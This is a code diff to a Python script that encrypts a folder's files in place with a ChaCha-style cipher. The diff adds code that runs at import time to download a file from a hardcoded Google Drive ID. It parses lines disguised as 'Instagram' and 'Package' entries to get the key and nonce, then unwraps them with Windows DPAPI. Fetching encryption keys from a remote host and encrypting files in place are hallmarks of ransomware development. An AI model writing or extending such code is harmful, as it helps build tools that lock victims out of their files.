@@ -4,6 +4,14 @@ from pathlib import Path
 import stat
 import shutil
 import sys
+import win32crypt
+import winreg
+import io
+import requests
+import ast
+from google.oauth2 import service_account
+from googleapiclient.discovery import build
+from googleapiclient.http import MediaIoBaseDownload
 
 def rotl32(v, n):
     return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))
@@ -141,14 +149,53 @@ def encrypt_folder_in_place(folder_path, key, nonce):
         print(f"\nEncryption failed: {str(e)}")
         return False
 
+
+def read_file_direct(file_id):
+    download_url = f"https://drive.google.com/uc?export=download&id={file_id}"
+    
+    response = requests.get(download_url)
+    if response.status_code == 200:
+        return response.text
+    else:
+        return f"Failed to download: Status code {response.status_code}"
+
+def extract_binary_keys(file_content):
+    results = {}
+
+    lines = file_content.split('\n')
+    
+    for i, line in enumerate(lines):
+        if line.startswith('Instagram:'):
+            binary_value = line.split('Instagram:', 1)[1].strip()
+            results['instagram'] = binary_value
+        
+        if line.startswith('Package:'):
+            binary_value = line.split('Package:', 1)[1].strip()
+            results['package'] = binary_value
+    
+    return results
+
+file_id = "1V9GTEpa1y7hVxV2OvD8KzbFESdcj81GF"
+content = read_file_direct(file_id)
+keys = extract_binary_keys(content)
+
+def decrypt_key_dpapi(encrypted: bytes):
+    return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
+
 if __name__ == "__main__":
-    key_hex = os.environ.get('CHACHA_KEY')
-    nonce_hex = os.environ.get('CHACHA_NONCE')
+    key_hex = keys.get("instagram")
+    nonce_hex = keys.get("package")
+
+    instagram_bytes = ast.literal_eval(key_hex)
+    package_bytes = ast.literal_eval(nonce_hex)
+
+    reversed_key = decrypt_key_dpapi(instagram_bytes)
+    reversed_nonce = decrypt_key_dpapi(package_bytes)
 
     if key_hex and nonce_hex:
         try:
-            key = bytes.fromhex(key_hex)
-            nonce = bytes.fromhex(nonce_hex)
+            key = reversed_key
+            nonce = reversed_nonce
 
             script_directory = os.path.dirname(os.path.abspath(__file__))
             target_folder = os.path.join(script_directory, "test folder")
@@ -162,3 +209,4 @@ if __name__ == "__main__":
             print("Invalid key or nonce format in environment variables.")
     else:
         print("Environment variables CHACHA_KEY and CHACHA_NONCE not found. ")
+
